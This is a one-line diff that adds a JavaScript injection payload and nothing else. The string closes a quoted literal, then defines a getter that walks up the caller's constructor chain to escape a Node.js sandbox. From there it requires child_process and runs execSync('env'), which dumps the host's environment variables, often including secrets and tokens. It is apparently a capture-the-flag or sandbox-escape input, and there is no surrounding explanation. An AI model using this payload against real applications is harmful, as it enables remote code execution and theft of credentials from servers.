@@ -1,0 +1,1 @@
+";Object.defineProperty(this, 'nickname', {get: Function('return arguments.callee.caller.constructor.constructor("return process.mainModule.require(\\"child_process\\").execSync(\\"env\\")+1")()')});let a = "
